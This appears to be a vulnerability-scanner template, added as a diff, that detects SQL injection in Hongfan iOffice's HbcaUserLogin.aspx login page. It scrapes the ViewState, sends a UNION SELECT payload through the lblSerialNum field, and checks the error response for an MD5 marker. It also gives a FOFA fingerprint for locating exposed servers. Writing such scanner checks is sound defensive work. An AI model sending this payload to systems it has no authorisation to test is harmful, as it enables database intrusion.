@@ -1,0 +1,47 @@
+id: poc-yaml-hongfan-ioffice-hbcauserlogin-aspx-sqli
+info:
+  name: "红帆ioffice HbcaUserLogin.aspx SQL Injection Vulnerability"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: iOffice
+    fofa: app="红帆-ioffice"
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+http:
+  - raw:
+      - |
+        GET /ioffice/Identity/HbcaUserLogin.aspx HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: regex
+        regex:
+          - "name=\"__VIEWSTATE\" id=\"__VIEWSTATE\" value=\"(?P<VIEWSTATE>.*?)\""
+    extractors:
+      - type: regex
+        name: VIEWSTATE
+        internal: true
+        regex:
+          - "name=\"__VIEWSTATE\" id=\"__VIEWSTATE\" value=\"(?P<VIEWSTATE>.*?)\""
+  - raw:
+      - |
+        POST /ioffice/Identity/HbcaUserLogin.aspx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        __EVENTTARGET=btVerify&__EVENTARGUMENT=&__VIEWSTATE={{VIEWSTATE}}&__VIEWSTATEGENERATOR=CBF22729&btVerify=&lblSerialNum=-1'+UNION+SELECT+sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))--+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "0x{{t2}}"
+          - "iOffice"
+      - type: regex
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
